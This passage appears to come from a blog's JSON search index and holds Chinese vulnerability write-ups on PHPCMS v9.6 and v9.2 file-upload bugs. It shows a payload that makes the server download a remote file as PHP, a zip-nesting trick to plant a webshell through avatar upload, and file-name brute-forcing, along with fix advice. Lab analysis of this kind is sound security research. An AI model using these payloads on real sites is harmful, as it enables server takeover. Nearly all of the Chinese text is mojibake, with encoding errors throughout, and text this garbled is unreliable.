æ‰§è¡Œå®Œä»¥åï¼Œè¿”å›$value=&quot;2021-03-13&quot;,ç„¶åè¿”å›getæ–¹æ³•ï¼Œæ‰§è¡Œ 12$info[$field] = $value;return $info; é€€å‡ºgetæ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›ï¼Œè¿›å…¥ps_member_registeræ–¹æ³• ç»§ç»­è·Ÿè¿›ï¼Œæ‰§è¡Œinsertæ“ä½œ F7è·Ÿè¿›,æ‰§è¡Œåˆ°ä¸‹å›¾ï¼Œå°†æ³¨å†Œä¿¡æ¯æ’å…¥æ•°æ®åº“ï¼Œæ³¨å†Œå®Œæˆã€‚ ä¹‹åè¿”å›åˆ°registerå‡½æ•° å½“$status &gt; 0æ—¶ï¼Œæ‰§è¡Œinsertæ“ä½œï¼Œè¿™é‡Œå°†ç”Ÿæ—¥æ—¥æœŸå’Œç”¨æˆ·idæ’å…¥åˆ°v9_member_detailè¡¨ä¸­ 1INSERT INTO `phpcmsv96`.`v9_member_detail`(`birthday`,`userid`) VALUES (&#x27;2021-03-13&#x27;php,&#x27;26&#x27;) åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬è‚¯å®šè¿˜æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸Šé¢è°ƒç”¨çš„å‡½æ•°æ˜¯datetime,å…ˆä¸æ€¥ï¼Œæˆ‘ä»¬æ•´ç†ä¸€ä¸‹æ³¨å†Œçš„æ‰§è¡Œæµç¨‹ï¼š ä½ æ˜¯ä¸æ˜¯å‘ç°äº†ä»€ä¹ˆï¼Ÿ,æ¥ä¸‹æ¥æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹ä¸ºä»€ä¹ˆ$func=&quot;datetime&quot;ã€‚ é¦–é¡µç”±äº$func = $this-&gt;fields[$field][&#39;formtype&#39;]ï¼Œæˆ‘ä»¬æŒ‰ctrlç‚¹å‡»$this-&gt;fieldsï¼ŒåŒä¸€æ–‡ä»¶ï¼Œç¬¬11è¡Œå¾—åˆ°çš„ï¼Œè¿™é‡Œä¼ äº†ä¸ª&#39;model_field_&#39;.$modelid, è€Œ$modelid = 10ï¼Œè·Ÿè¿›ä¸€ä¸‹getcacheæ–¹æ³• è·³è½¬è‡³phpsso_server/phpcms/libs/functions/global.func.phpæ–‡ä»¶ï¼Œå‡½æ•°å†…å®¹å¦‚ä¸‹: 123456789101112function getcache($name, $filepath=&#x27;&#x27;, $type=&#x27;file&#x27;, $config=&#x27;&#x27;) &#123; if(!preg_match(&quot;/^[a-zA-Z0-9_-]+$/&quot;, $name)) return false; if($filepath!=&quot;&quot; &amp;&amp; !preg_match(&quot;/^[a-zA-Z0-9_-]+$/&quot;, $filepath)) return false; pc_base::load_sys_class(&#x27;cache_factory&#x27;,&#x27;&#x27;,0); if($config) &#123; $cacheconfig = pc_base::load_config(&#x27;cache&#x27;); $cache = cache_factory::get_instance($cacheconfig)-&gt;get_cache($config); &#125; else &#123; $cache = cache_factory::get_instance()-&gt;get_cache($type); &#125; return $cache-&gt;get($name, &#x27;&#x27;, &#x27;&#x27;, $filepath);&#125; å› ä¸º$configæœªè¿›è¡Œä¼ å‚ï¼Œé»˜è®¤ä¸ºç©ºï¼Œå› æ­¤æ‰§è¡Œçš„æ˜¯$cache = cache_factory::get_instance()-&gt;get_cache($type);,æ‰§è¡Œget_caheæ–¹æ³•ï¼Œä¼ å…¥å‚æ•°$type=&#39;file&#39;, è·Ÿè¿›ä¸€ä¸‹æ­¤æ–¹æ³•ï¼š 123456789// phpcms/libs/classes/cache_factory.class.php 53è¡Œå¤„ protected $cache_list = array(); public function get_cache($cache_name) &#123; if(!isset($this-&gt;cache_list[$cache_name]) || !is_object($this-&gt;cache_list[$cache_name])) &#123; $this-&gt;cache_list[$cache_name] = $this-&gt;load($cache_name); &#125; return $this-&gt;cache_list[$cache_name]; &#125; $cache_listæ˜¯ä¸ªç©ºæ•°ç»„ï¼Œå› æ­¤$this-&gt;cache_list[$cache_name]ä¸å­˜åœ¨ï¼Œä¸”ä¸æ˜¯å¯¹è±¡ã€‚è·Ÿç€ä¼šæ‰§è¡Œä¸‹é¢çš„ä»£ç ï¼Œæˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹loadæ–¹æ³•. 1$this-&gt;cache_list[$cache_name] = $this-&gt;load($cache_name); loadæ–¹æ³•ä»£ç å¦‚ä¸‹ï¼š 12345678910public function load($cache_name) &#123; $object = null; if(isset($this-&gt;cache_config[$cache_name][&#x27;type&#x27;])) &#123; switch($this-&gt;cache_config[$cache_name][&#x27;type&#x27;]) &#123; case &#x27;file&#x27; : $object = pc_base::load_sys_class(&#x27;cache_file&#x27;); break; case &#x27;memcache&#x27; : define(&#x27;MEMCACHE_HOST&#x27;, $this-&gt;cache_config[$cache_name][&#x27;hostname&#x27;]); define(&#x27;MEMCACHE_PORT&#x27;, $this-&gt;cache_config[$cache_name][&#x27;port&#x27;]); ç”±äº$cache_name = &#39;file&#39;, ä»è€Œæ‰§è¡Œ$object = pc_base::load_sys_class(&#39;cache_file&#39;);,è·Ÿè¿›ä¸€ä¸‹pc_base::load_sys_classæ–¹æ³• è°ƒç”¨äº†_load_classç±»ï¼Œç»§ç»­è¿›å…¥ 122è¡Œçš„ä»£ç ä¸ä¼šæ‰§è¡Œï¼Œå› ä¸ºæ–‡ä»¶è·¯åŠ²ä¸­æ²¡æœ‰è‡ªå·±çš„æ‰©å±•æ–‡ä»¶ï¼Œmy_pathæ–¹æ³•ä»£ç å¦‚ä¸‹ï¼š 123456789public static function my_path($filepath) &#123; $path = pathinfo($filepath); if (file_exists($path[&#x27;dirname&#x27;].DIRECTORY_SEPARATOR.&#x27;MY_&#x27;.$path[&#x27;basename&#x27;])) &#123; return $path[&#x27;dirname&#x27;].DIRECTORY_SEPARATOR.&#x27;MY_&#x27;.$path[&#x27;basename&#x27;]; // æ²¡æœ‰ my_cache_file.class.php &#125; else &#123; return false; &#125;&#125; ä¸Šå›¾æ‰§è¡Œåˆ°130è¡Œï¼Œè¿”å›äº†cache_fileå¯¹è±¡ï¼ˆå› ä¸º$name=&#39;cache_file&#39;ï¼‰ï¼Œå†…å®¹è§ä¸‹å›¾ï¼š è¿™é‡Œè¿”å›å®Œäº†ä»¥åï¼Œé€€å‡ºåˆ°æ‰§è¡Œphpsso_server/phpcms/libs/functions/global.func.phpä¸­548è¡Œå¤„getæ–¹æ³•ï¼Œä»£ç å¦‚ä¸‹ï¼š ä»£ç ä¼ å…¥çš„å‚æ•°$nameå°±æ˜¯ä¸‹å›¾çš„&#39;model_field_&#39;.$modelid = &#39;model_field_10&#39;ï¼š çœ‹çœ‹getæ–¹æ³•ï¼Œå¯ä»¥å‘ç°ï¼Œå®ƒåŒ…å«äº†/caches/caches_model/caches_data/model_field_10.cache.phpæ–‡ä»¶ ä¸”91è¡Œè¿”å›äº†/caches/caches_model/caches_data/model_field_10.cache.phpä¸­çš„å†…å®¹ å†…å®¹å¦‚ä¸‹ï¼š $func = $this-&gt;fields[$field][&#39;formtype&#39;]; å¯¹åº”æ­¤æ–‡ä»¶ä¸­&#39;formtype&#39; =&gt; datetimeï¼Œå› æ­¤è¿™é‡Œ$func = datetimeã€‚ å½“ç„¶ï¼Œè¿™é‡Œæ•°æ®ä¹Ÿå¯ä»¥é€šè¿‡æ•°æ®åº“ä¸­v9_member_fieldè¡¨è·å–ã€‚ å¯èƒ½ä¸Šé¢æè¿°çš„ä¸å¤ªç›´è§‚ï¼Œæˆ‘ä»¬å†æ¬¡æ¢³ç†ä¸€ä¸‹è·å–datetimeå‡½æ•°çš„æµç¨‹ï¼š æ¥ä¸‹æ¥æˆ‘ä»¬åˆ†æpoc æ³¨æ„ï¼šå†ä¸€æ¬¡ä½¿ç”¨pocçš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦ä¿è¯usernameå€¼å’Œemailæ˜¯å”¯ä¸€çš„ é€šè¿‡ä¸Šé¢çš„åˆ†æï¼Œç›´æ¥ä¸‹æ–­ç‚¹åˆ°å…³é”®å¤„ å¦‚ä¸Šå›¾ï¼Œè¿™é‡Œè·å–çš„æ˜¯editorå‡½æ•°ï¼Œè€Œåœ¨è¿™ä¸ªå‡½æ•°ä¸­ï¼Œæœ‰ä¸ªdownloadæ–¹æ³•(ä¸‹å›¾ï¼Œæ–‡ä»¶åœ¨caches/caches_model/caches_data/member_input.class.php) ä¸Šé¢å…³é”®ä»£ç å¦‚ä¸‹ï¼š 1234$ext = &#x27;gif|jpg|jpeg|bmp|png&#x27;;...$string = new_stripslashes($value);if(!preg_match_all(&quot;/(href|src)=([\\&quot;|&#x27;]?)([^ \\&quot;&#x27;&gt;]+\\.($ext))\\\\2/i&quot;,$string, $matches)) return $value; è¿™ä¸ªæ­£åˆ™åŒ¹é…ä¸éš¾ç†è§£ï¼Œéœ€è¦æ»¡è¶³href/src=url. (gif|jpg|jpeg|bmp|png) ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬å†™info[content]=&lt;img src=http://www.tao.com/a.txt?.php#.jpgï¼ˆç¬¦åˆè¿™ä¸ªæ ¼å¼ï¼Œè€Œä¸”åŠ .jpgçš„åŸå› ï¼‰ï¼Œæ¥ç€è¿›å…¥fillurlæ–¹æ³• åœ¨ä¸Šå›¾çš„fillurlæ–¹æ³•ä¸­,é€šè¿‡ä¸‹é¢ä»£ç å»æ‰äº†é”šç‚¹. 12$pos = strpos($surl,&#x27;#&#x27;);if($pos&gt;0) $surl = substr($surl,0,$pos); strposå®šä½#, ç„¶åä½¿ç”¨substrå¤„ç†http://www.tao.com/t.txt?.php#.jpg, å¤„ç†å®Œä¹‹å$surl = http://www.tao.com/t.txt?.phpã€‚ ç»§ç»­æ‰§è¡Œï¼Œå¯ä»¥å‘ç°è¿”å›çš„urlå»æ‰äº†#åé¢çš„å†…å®¹ ä¸‹é¢166è¡Œå¤„è·å–äº†ä¸Šé¢è¿”å›urlçš„åç¼€ï¼ŒåŠphp,é€šè¿‡getnameæ–¹æ³•è¿›è¡Œé‡å‘½åï¼Œå¯ä»¥å‘ç°çš„æ˜¯ï¼Œgetnameæ–¹æ³•è¿”å›çš„æ–‡ä»¶åä¹Ÿåªæ˜¯æ—¶é—´+éšæœºçš„ä¸‰ä½æ•°ã€‚å¦‚æœä¸è¿”å›ä¸Šä¼ æ–‡ä»¶çš„urlåœ°å€ï¼Œä¹Ÿå¯ä»¥é€šè¿‡çˆ†ç ´è·å–ã€‚ æ¥ç€ç¨‹åºè°ƒç”¨äº†copyå‡½æ•°,å¯¹è¿œç¨‹çš„urlæ–‡ä»¶è¿›è¡Œäº†ä¸‹è½½ è¿™é‡Œçš„$this-&gt;upload_funcæ˜¯copyå‡½æ•°çš„åŸå› ,æ˜¯å› ä¸ºåˆå§‹åŒ–æ—¶èµ‹ç»™çš„ï¼ˆçœ‹ä¸‹å›¾ï¼‰ æ­¤æ—¶èƒ½çœ‹åˆ°æˆ‘ä»¬è¦å†™å…¥çš„å†…å®¹å·²ç»æˆåŠŸå†™å…¥æ–‡ä»¶äº†ã€‚ æ¥ç€æˆ‘ä»¬æ¥çœ‹çœ‹å†™å…¥æ–‡ä»¶çš„è·¯åŠ²æ˜¯å¦‚ä½•è¿”å›ç»™æˆ‘ä»¬çš„ã€‚ä¸Šé¢ç¨‹åºæ‰§è¡Œå®Œä»¥åï¼Œå›åˆ°äº†registerå‡½æ•°ä¸­ï¼š F7è·Ÿè¿› 1INSERT INTO `phpcmsv96`.`v9_member_detail`(`content`,`userid`) VALUES (&#x27;&amp;lt;img src=http://www.phpcms96.com/uploadfile/2021/0314/20210314103307168.php&amp;gt;&#x27;,&#x27;25&#x27;) å¯ä»¥å‘ç°ï¼Œä¸Šä¸Šå›¾140è¡Œå¤„$status &gt; 0æ—¶ä¼šæ‰§è¡Œä¸Šé¢çš„SQLè¯­å¥ï¼Œä¹Ÿå°±æ˜¯å‘v9_member_detailçš„contentå’Œuseridä¸¤åˆ—æ’å…¥æ•°æ® ä½†æ˜¯ç”±äºv9_member_detailè¡¨ç»“æ„ä¸­æ²¡æœ‰contentåˆ—ï¼Œäº§ç”Ÿäº†æŠ¥é”™ã€‚ä»è€Œå°†æ’å…¥æ•°æ®ä¸­çš„sqlæŠ¥é”™è¯­å¥(åŒ…å«shell è·¯å¾„)è¿”å›äº†å‰å°é¡µé¢ã€‚ å‰é¢è¯´140è¡Œ$status&gt;0 æ—¶æ‰ä¼šæ‰§è¡Œ SQL è¯­å¥è¿›è¡Œ INSERT æ“ä½œã€‚æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ä»€ä¹ˆæ—¶å€™$status &lt;= 0,ä¸æ‰§è¡Œinsertå‘¢? é€šè¿‡å‰é¢139è¡Œæˆ‘ä»¬å‘ç°$statusæ˜¯ç”±clientç±»ä¸­ps_member_registeræ–¹æ³•è¿”å›çš„ï¼ˆå‡½æ•°è·¯åŠ²åœ¨ï¼š phpcms/modules/member/classes/client.class.php ï¼‰ $status &lt;= 0éƒ½æ˜¯å› ä¸ºç”¨æˆ·åå’Œé‚®ç®±ä¸å”¯ä¸€å¯¼è‡´çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬payloadå°½é‡è¦éšæœº å¦å¤–åœ¨ phpsso æ²¡æœ‰é…ç½®å¥½çš„æ—¶å€™$statusçš„å€¼ä¸ºç©ºï¼Œä¹ŸåŒæ ·ä¸èƒ½å¾—åˆ°è·¯å¾„ åœ¨æ— æ³•å¾—åˆ°è·¯å¾„çš„æƒ…å†µä¸‹æˆ‘ä»¬åªèƒ½çˆ†ç ´äº† ï¼Œæ–‡ä»¶åçš„ç”Ÿæˆæ–¹æ³•(åœ¨phpcms/libs/classes/attachment.class.php) è¿”å›çš„æ–‡ä»¶åä¹Ÿåªæ˜¯æ—¶é—´+éšæœºçš„ä¸‰ä½æ•°ã€‚æ¯”è¾ƒå®¹æ˜“çˆ†ç ´çš„ã€‚ æ¼æ´ä¿®å¤åœ¨phpcms9.6.1ä¸­ä¿®å¤äº†è¯¥æ¼æ´ï¼Œä¿®å¤æ–¹æ¡ˆå°±æ˜¯å¯¹ç”¨fileextè·å–åˆ°çš„æ–‡ä»¶åç¼€å†ç”¨é»‘ç™½åå•åˆ†åˆ«è¿‡æ»¤ä¸€æ¬¡","categories":[{"name":"PHP","slug":"PHP","permalink":"https://bobtaoy.github.io/categories/PHP/"},{"name":"webå®‰å…¨","slug":"PHP/webå®‰å…¨","permalink":"https://bobtaoy.github.io/categories/PHP/web%E5%AE%89%E5%85%A8/"},{"name":"ä»£ç å®¡è®¡","slug":"PHP/webå®‰å…¨/ä»£ç å®¡è®¡","permalink":"https://bobtaoy.github.io/categories/PHP/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"PHPä»£ç å®¡è®¡","slug":"PHPä»£ç å®¡è®¡","permalink":"https://bobtaoy.github.io/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"ä»£ç å®¡è®¡ä¹‹PHPCMS_V9.2ä»»æ„æ–‡ä»¶ä¸Šä¼ getshellæ¼æ´åˆ†æ","slug":"ä»£ç å®¡è®¡ä¹‹PHPCMSV9-2ä¸Šä¼ æ¼æ´åˆ†æ","date":"2021-02-06T11:10:11.000Z","updated":"2021-03-16T02:26:03.582Z","comments":true,"path":"2021/02/06/ä»£ç å®¡è®¡ä¹‹PHPCMSV9-2ä¸Šä¼ æ¼æ´åˆ†æ/","link":"","permalink":"https://bobtaoy.github.io/2021/02/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMSV9-2%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"PHPCMS_V9.2ä»»æ„æ–‡ä»¶ä¸Šä¼ getshellæ¼æ´åˆ†æä»‹ç»&amp;é¢„å¤‡çŸ¥è¯†ä»‹ç»ï¼šPHPCMSæ˜¯ä¸€æ¬¾ç½‘ç«™ç®¡ç†è½¯ä»¶ã€‚è¯¥è½¯ä»¶é‡‡ç”¨æ¨¡å—åŒ–å¼€å‘,æ”¯æŒå¤šç§åˆ†ç±»æ–¹å¼ã€‚ é¢„å¤‡çŸ¥è¯†PHPCMSæ˜¯é‡‡ç”¨MVCè®¾è®¡æ¨¡å¼å¼€å‘,åŸºäºæ¨¡å—å’Œæ“ä½œçš„æ–¹å¼è¿›è¡Œè®¿é—®ï¼Œé‡‡ç”¨å•ä¸€å…¥å£æ¨¡å¼è¿›è¡Œé¡¹ç›®éƒ¨ç½²å’Œè®¿é—®ï¼Œæ— è®ºè®¿é—®ä»»ä½•ä¸€ä¸ªæ¨¡å—æˆ–è€…åŠŸèƒ½ï¼Œåªæœ‰ä¸€ä¸ªç»Ÿä¸€çš„å…¥å£ã€‚ å‚æ•°åç§° æè¿° ä½ç½® å¤‡æ³¨ m æ¨¡å‹/æ¨¡å—åç§° phpcms/modulesä¸­æ¨¡å—ç›®å½•åç§° å¿…é¡» c æ§åˆ¶å™¨åç§° phpcms/modules/æ¨¡å—/*.php æ–‡ä»¶åç§° å¿…é¡» a äº‹ä»¶åç§° phpcms/modules/æ¨¡å—/*.php ä¸­æ–¹æ³•åç§° æ¨¡å—è®¿é—®æ–¹æ³•[ç¤ºä¾‹]ï¼šhttp://www.xxx.com/index.php?m=content&amp;c=index&amp;a=show&amp;id=1å…¶ä¸­m = content ä¸ºæ¨¡å‹/æ¨¡å—åç§° ä½äºphpcms/modules/contentc = index ä¸ºæ§åˆ¶å™¨åç§° ä½äºphpcms/modules/content/index.phpa = show ä¸ºæ—¶é—´åç§° ä½äºphpcms/modules/content/index.phpä¸­show()æ–¹æ³•id = 1 ä¸ºå…¶ä»–å‚æ•° ä¸æ­£å¸¸getä¼ é€’å‚æ•°å½¢å¼ç›¸åŒ è¿˜æœ‰ä¸€ç‚¹å°±æ˜¯è®¿é—®http://www.xxx.com/index.php phpcmsé»˜è®¤è·¯ç”±ä¼šå®šä½åˆ°contentæ¨¡å—çš„indexæ§åˆ¶å™¨ä¸­çš„initæ“ä½œï¼Œå› ä¸ºç³»ç»Ÿåœ¨æ²¡æœ‰æŒ‡å®šæ¨¡å—å’Œæ§åˆ¶å™¨çš„æ—¶å€™ï¼Œä¼šæ‰§è¡Œé»˜è®¤çš„æ¨¡å—å’Œæ“ä½œ. æ‰€ä»¥è·Ÿè®¿é—®http://www.xxx.com/index.php?m=content&amp;c=index&amp;a=initæ˜¯ä¸€æ ·çš„ å‚è€ƒæ¥æºï¼šhttp://www.sjzphp.com/webdis/router_url_907.html ç¯å¢ƒæ­å»º&amp;æ‰€éœ€å·¥å…· phpstudy2018 php-5.4.45-nts + Apache PHPCMS_V9.2 Burpsuite æµ‹è¯•ç«™ç‚¹ç½‘å€ï¼šwww.phpcms92.com è®¿é—®/install/install.phpæ–‡ä»¶è¿›è¡Œå®‰è£…ï¼Œä¸‹ä¸€æ­¥ ä¸‹ä¸€æ­¥ï¼Œé…ç½®ç›¸å…³ä¿¡æ¯ å®‰è£…å®Œæˆï¼ï¼ï¼ æ¼æ´å¤ç°è®¿é—®é¦–é¡µindex.php æ³¨å†Œä¸€ä¸ªè´¦æˆ·(è¿™é‡Œæˆ‘ä»¥Taoè¿™ä¸ªæ™®é€šç”¨æˆ·è¿›è¡Œæ¼”ç¤º) åˆ°ä¸ªäººä¸»é¡µä¿®æ”¹å¤´åƒå¤„ï¼Œä¸Šä¼ å¤´åƒ åœ¨æ­¤ä¹‹å‰ï¼Œè¿˜è¦å‡†å¤‡ä¸€ä¸ªåç¼€ä¸ºzipçš„å‹ç¼©åŒ…ï¼Œå…·ä½“å†…å®¹å¦‚ä¸‹ï¼š phpæ–‡ä»¶éœ€è¦æ”¾åœ¨äºŒå±‚ç›®å½•ä¸‹ç„¶åå†è¿›è¡Œå‹ç¼© ä¸Šä¼ å¤´åƒç…§ç‰‡ï¼ˆBurpæŠ“åŒ…ï¼‰-&gt;ä¿å­˜å›¾ç‰‡ å°†ä¹‹å‰çš„å›¾ç‰‡æ•°æ®åˆ é™¤ å°†Tao.zipä¸­æ•°æ®ï¼ŒæŒ‰ç…§ä¸Šå›¾çš„æ“ä½œæ·»åŠ è‡³è¯·æ±‚ä¸­ï¼Œæœ€ç»ˆæ•ˆæœå¦‚ä¸‹å›¾ã€‚ç„¶åæ”¾è¡Œ è®¿é—®phpsso_server/uploadfile/avatar/1/1/1/dir/404.phpï¼ˆè¿™é‡Œçš„1æ˜¯æ³¨å†Œåç”¨æˆ·çš„idï¼‰ æ¼æ´åˆ†æåœ¨åˆ†æä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆè¯´ä¸€ä¸‹æ¼æ´å­˜åœ¨å¤„çš„åŠŸèƒ½ï¼Œæ‰§è¡Œæµç¨‹ï¼Œä»¥åŠæ¼æ´äº§ç”Ÿçš„åŸå› ã€‚ åœ¨ç¼–è¾‘å¤´åƒå¤„ï¼Œæˆ‘ä»¬ä¸Šä¼ å¤´åƒï¼Œå‰ç«¯ä¼šå°†æˆ‘ä»¬ä¸Šä¼ çš„å›¾ç‰‡è¿›è¡Œåˆ†å‰²æˆä¸‰å¼ (ä¸‰ä¸ªå°ºå¯¸å¤§å°)ã€‚ç„¶åå‰ç«¯æ‰“åŒ…å‹ç¼©æˆzipæ•°æ®ï¼Œå½“æˆ‘ä»¬ä¿å­˜å›¾ç‰‡æ—¶ï¼Œæˆ‘ä»¬çš„å‹ç¼©åŒ…æ•°æ®ä¼šä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œé€šè¿‡uploadavatarå‡½æ•°è¿›è¡Œå¤„ç†(å‡½æ•°åœ¨æ–‡ä»¶phpsso_server/phpcms/modules/phpsso/index.php)ï¼›è€Œè¿™ä¸ªå‡½æ•°çš„æ‰§è¡Œæµç¨‹å°±æ˜¯ï¼š åœ¨ä¿å­˜ä¸Šä¼ å¤´åƒæ–‡ä»¶å¤¹å¤„ï¼Œåˆ›å»ºä¸€ä¸ªè·Ÿç”¨æˆ·idå¯¹åº”çš„æ–‡ä»¶å¤¹ å°†å‰ç«¯æ‰“åŒ…çš„å‹ç¼©åŒ…é€šè¿‡postä¼ æ¥çš„æ•°æ®è¿›è¡Œä¿å­˜ï¼Œä¿å­˜åä¸ºç”¨æˆ·idçš„zipæ–‡ä»¶ è§£å‹æ•°æ®åŒ… åˆ¤æ–­æœªåœ¨æ•°ç»„å†…æ–‡ä»¶åå‘½åçš„æ–‡ä»¶ï¼Œä¸æ˜¯åˆ™é€šè¿‡unlinkå‡½æ•°éå†åˆ é™¤ ä¸Šé¢æµç¨‹å­˜åœ¨é—®é¢˜çš„åœ°æ–¹æœ‰ï¼Œ1.æœªå¯¹å‹ç¼©åŒ…å†…å®¹è¿›è¡Œå¤„ç†ï¼Œ2.è§£å‹éå†åˆ é™¤ä½¿ç”¨çš„æ˜¯unlinkå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°åªèƒ½åˆ é™¤æ–‡ä»¶ï¼Œä¸èƒ½åˆ é™¤æ–‡ä»¶å¤¹ã€‚å› ä¸ºè¿™ä¸€åŸå› ï¼Œæˆ‘ä»¬åªéœ€å°†å‹ç¼©åŒ…æ–‡ä»¶é‡Œå¸¦ä¸€ä¸ªç›®å½•ï¼Œç›®å½•é‡Œå¸¦æ¶æ„æ–‡ä»¶ï¼Œå³å¯ç»•è¿‡ã€‚ å›¾ç‰‡å¤„ç†è¯·æ±‚ä¸º/phpsso_server/index.php?m=phpsso&amp;c=index&amp;a=uploadavatar å®šä½æ–‡ä»¶phpsso_server/phpcms/modules/phpsso/index.php572è¡Œ ä¸ºä»€ä¹ˆå®šä½åˆ°è¿™ï¼Œå¼€å¤´ä»‹ç»æœ‰è¯´ è°ƒè¯•ï¼Œå‘ä¸‹æ‰§è¡Œ 123456789public function uploadavatar() &#123; //æ ¹æ®ç”¨æˆ·idåˆ›å»ºæ–‡ä»¶å¤¹ if(isset($this-&gt;data[&#x27;uid&#x27;]) &amp;&amp; isset($this-&gt;data[&#x27;avatardata&#x27;])) &#123; $this-&gt;uid = $this-&gt;data[&#x27;uid&#x27;]; $this-&gt;avatardata = $this-&gt;data[&#x27;avatardata&#x27;]; &#125; else &#123; exit(&#x27;0&#x27;); &#125; å¯ä»¥å‘ç°$this-&gt;data[&#39;avatardata&#39;]å˜é‡å­˜å‚¨ç€æˆ‘ä»¬ä¸Šä¼ ä¿®æ”¹çš„æ•°æ®ï¼ˆæ¶æ„ï¼‰ è€Œ$this-&gt;data[&#39;avatardata&#39;]æ˜¯é€šè¿‡ä¼ªåè®®è·å–çš„(æ–‡ä»¶ä¸ºphpsso_server/phpcms/modules/phpsso/classes/phpsso.class.php)ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š 1234$postStr = file_get_contents(&quot;php://input&quot;);if($postStr) &#123; $this-&gt;data[&#x27;avatardata&#x27;] = $postStr;&#125; ç»§ç»­å‘ä¸‹èµ°ï¼Œæ–°å»ºå­˜æ”¾å›¾ç‰‡ç›®å½• 12345678//åˆ›å»ºå›¾ç‰‡å­˜å‚¨æ–‡ä»¶å¤¹$avatarfile = pc_base::load_config(&#x27;system&#x27;, &#x27;upload_path&#x27;).&#x27;avatar/&#x27;;$dir = $avatarfile.$dir1.&#x27;/&#x27;.$dir2.&#x27;/&#x27;.$this-&gt;uid.&#x27;/&#x27;;if(!file_exists($dir)) &#123; mkdir($dir, 0777, true);&#125; $filename = $dir.$this-&gt;uid.&#x27;.zip&#x27;;file_put_contents($filename, $this-&gt;avatardata); ä¸Šé¢ä»£ç ç¬¬äº”è¡Œåˆ›å»ºç›®å½•ã€‚ä¹‹åè¿›è¡Œæ–°å‘½åå‹ç¼©åŒ…ï¼Œåä¸ºç”¨æˆ·idå€¼ã€‚ç„¶åå°†æˆ‘ä»¬ä¸Šé¢é€šè¿‡ä¼ªåè®®è·å–çš„æ•°æ®è¿›è¡Œå†™å…¥ å¦‚ä¸‹å›¾ï¼Œå¯ä»¥å‘ç°ï¼Œæ–°å»ºäº†1.zip å‹ç¼©åŒ…å†…å®¹å¦‚ä¸‹ï¼Œå°±æ˜¯æˆ‘ä»¬ä¿®æ”¹ä¸Šä¼ çš„æ•°æ® ä¹‹åè§£å‹ç¼©ã€‚ã€‚ã€‚ èµ°åˆ°éå†ç™½åå•åˆ¤æ–­æ–‡ä»¶ï¼Œæ’é™¤.ï¼ˆå½“å‰ç›®å½•ï¼‰..ï¼ˆä¸Šçº§ç›®å½•ï¼‰ ä¸‹å›¾åˆ é™¤äº†å‹ç¼©åŒ…æ–‡ä»¶ ç»§ç»­æ‰§è¡Œï¼Œå½“åˆ¤æ–­åˆ°dirç›®å½•æ—¶ï¼Œå› ä¸ºdirç›®å½•ä¸å±äºæ•°ç»„é‡Œï¼ˆç™½åå•ï¼‰ï¼Œç„¶åæ‰§è¡Œunlink(dirç›®å½•)ã€‚ç”±äºunlinkå‡½æ•°åªèƒ½åˆ é™¤æ–‡ä»¶ï¼Œæ— æ³•åˆ é™¤æ–‡ä»¶å¤¹ï¼Œæ‰€ä»¥å°±ç•™ä¸‹äº†æ¶æ„ä»£ç æ–‡ä»¶ã€‚ æ¥ç€è·³å‡ºäº†ifè¯­å¥ï¼Œç»§ç»­æ‰§è¡Œï¼Œå°†ä¿¡æ¯æ›´æ–°è‡³æ•°æ®åº“ æ‰€ä»¥ï¼Œæ¼æ´äº§ç”Ÿçš„åŸå› å°±æ˜¯unlinkå‡½æ•° 12if(!in_array($file, $avatararr)) &#123; @unlink($dir.$file); // æ¼æ´äº§ç”Ÿçš„åŸå›  å› ä¸ºunlinkæ— æ³•åˆ é™¤æ–‡ä»¶å¤¹ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆä¸Šé¢åˆ©ç”¨çš„å‹ç¼©åŒ…é‡Œçš„æ¶æ„ä»£ç æ–‡ä»¶éœ€è¦æ”¾åœ¨ç›®å½•ä¸‹ æ¼æ´ä¿®å¤ ä¸ä½¿ç”¨zipå‹ç¼©åŒ…å¤„ç†å›¾ç‰‡æ–‡ä»¶ ä½¿ç”¨æœ€æ–°ç‰ˆçš„phpcms","categories":[{"name":"PHP","slug":"PHP","permalink":"https://bobtaoy.github.io/categories/PHP/"},{"name":"webå®‰å…¨","slug":"PHP/webå®‰å…¨","permalink":"https://bobtaoy.github.io/categories/PHP/web%E5%AE%89%E5%85%A8/"},{"name":"ä»£ç å®¡è®¡","slug":"PHP/webå®‰å…¨/ä»£ç å®¡è®¡","permalink":"https://bobtaoy.github.io/categories/PHP/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"PHPä»£ç å®¡è®¡","slug":"PHPä»£ç å®¡è®¡","permalink":"https://bobtaoy.github.io/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"ä»£ç å®¡è®¡ä¹‹BlueCMS_V1.6","slug":"ä»£ç å®¡è®¡ä¹‹BlueCMS-V1-6","date":"2021-02-02T13:35:01.000Z","updated":"2021-03-16T02:33:39.416Z","comments":true,"path":"2021/02/02/ä»£ç å®¡è®¡ä¹‹BlueCMS-V1-6/","link":"","permalink":"https://bobtaoy.github.io/2021/02/02/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BBlueCMS-V1-6/","excerpt":"","text":"ä»£ç 